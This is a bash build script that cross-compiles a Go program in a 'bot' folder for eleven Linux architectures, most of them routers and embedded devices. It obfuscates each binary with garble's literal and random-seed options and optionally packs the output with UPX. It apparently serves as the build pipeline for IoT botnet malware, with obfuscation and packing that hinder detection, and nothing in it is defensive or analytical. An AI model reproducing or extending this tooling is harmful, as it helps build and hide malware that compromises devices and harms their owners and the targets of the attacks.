#!/bin/bash

build() {
    rm -rf bin
    mkdir bin
    cd bot
    clear

    echo ====================================
    echo "         MIPS Building..."
    echo ====================================

    GOOS=linux GOARCH=mips CGO_ENABLED=0 garble -seed=random -literals -tiny build -o ../bin/mips.bin .
    clear

    echo ====================================
    echo "        PowerPC64 Building..."
    echo ====================================

    GOOS=linux GOARCH=ppc64 CGO_ENABLED=0 garble -seed=random -literals -tiny build -o ../bin/ppc64.bin .
    clear

    echo ====================================
    echo "        MIPS32LE Building..."
    echo ====================================

    GOOS=linux GOARCH=mipsle CGO_ENABLED=0 garble -seed=random -literals -tiny build -o ../bin/mips32le.bin .
    clear

    echo ====================================
    echo "        MIPS64LE Building..."
    echo ====================================

    GOOS=linux GOARCH=mips64le CGO_ENABLED=0 garble -seed=random -literals -tiny build -o ../bin/mips64le.bin .
    clear

    echo ====================================
    echo "        Risc-V (64) Building..."
    echo ====================================

    GOOS=linux GOARCH=riscv64 CGO_ENABLED=0 garble -seed=random -literals -tiny build -o ../bin/riscv.bin .
    clear

    echo ====================================
    echo "        IBMzSeries Building..."
    echo ====================================

    GOOS=linux GOARCH=s390x CGO_ENABLED=0 garble -seed=random -literals -tiny build -o ../bin/s390x.bin .
    clear

    echo ====================================
    echo "         ARMv7 Building..."
    echo ====================================
    GOOS=linux GOARCH=arm GOARM=7 CGO_ENABLED=0 garble -seed=random -literals -tiny build -o ../bin/arm7.bin .
    clear

    echo ====================================
    echo "         ARMv6 Building..."
    echo ====================================

    GOOS=linux GOARCH=arm GOARM=6 CGO_ENABLED=0 garble -seed=random -literals -tiny build -o ../bin/arm6.bin .
    clear

    echo ====================================
    echo "         ARMv5 Building..."
    echo ====================================
    GOOS=linux GOARCH=arm GOARM=5 CGO_ENABLED=0 garble -seed=random -literals -tiny build -o ../bin/arm5.bin .
    clear

    echo ====================================
    echo "         X86_64 Building..."
    echo ====================================
    GOOS=linux GOARCH=amd64 CGO_ENABLED=0 garble -seed=random -literals -tiny build -o ../bin/x86_64.bin .
    clear

    echo ====================================
    echo "         X32 Building..."
    echo ====================================
    GOOS=linux GOARCH=386 CGO_ENABLED=0 garble -seed=random -literals -tiny build -o ../bin/x32.bin .
    clear
    cd ..

}

cleanup() {

    if ! command -v upx &>/dev/null; then
        echo "UPX Packer has not been installed. Skipping..."
        echo "Build success. Binary files in the bin folder"
        exit
    fi

    cd bin
    upx --brute --lzma x86_64.bin >/dev/null 2>&1
    upx --brute --lzma x32.bin >/dev/null 2>&1
    upx --brute --lzma mips.bin >/dev/null 2>&1
    upx --brute --lzma arm6.bin >/dev/null 2>&1
    upx --brute --lzma arm7.bin >/dev/null 2>&1
    upx --brute --lzma mips32le.bin >/dev/null 2>&1
    upx --brute --lzma mips64le.bin >/dev/null 2>&1
    upx --brute --lzma ppc64.bin >/dev/null 2>&1

}

# go clean -cache

if ! command -v garble &>/dev/null; then
    echo "Garble has not been installed"
    exit
fi

if [[ $1 == "upx" ]]; then
    build

    echo ====================================
    echo "           Compressing..."
    echo ====================================

    cleanup
elif [[ $1 == "standart" ]]; then
    build
else
    echo "Invalid args"
fi
